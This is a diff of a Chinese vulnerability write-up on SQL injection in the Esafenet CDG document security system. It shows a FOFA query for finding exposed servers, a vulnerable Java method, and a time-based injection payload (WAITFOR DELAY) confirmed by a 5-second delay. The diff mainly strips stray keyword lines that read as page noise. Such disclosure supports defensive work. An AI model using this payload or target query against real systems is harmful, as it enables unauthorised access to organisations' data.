@@ -15,8 +15,6 @@ asset_dir: embedded-base64
 # fofa语法
 
 > app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"
->
-> 编程
 
 # 漏洞分析
 
@@ -47,14 +45,6 @@ public MailDecryptApplicationInfo findById(String id) throws Exception {
     }
 }
 ```
-
-深入探索
-
-搜索引擎
-
-软件
-
-代理
 
 继续跟进 `findByPrecise` 方法
 
@@ -109,4 +99,4 @@ id=1'WAITFOR+DELAY'0%3a0%3a5'--
 
 成功延时 5 秒
 
-数据管理
+编程
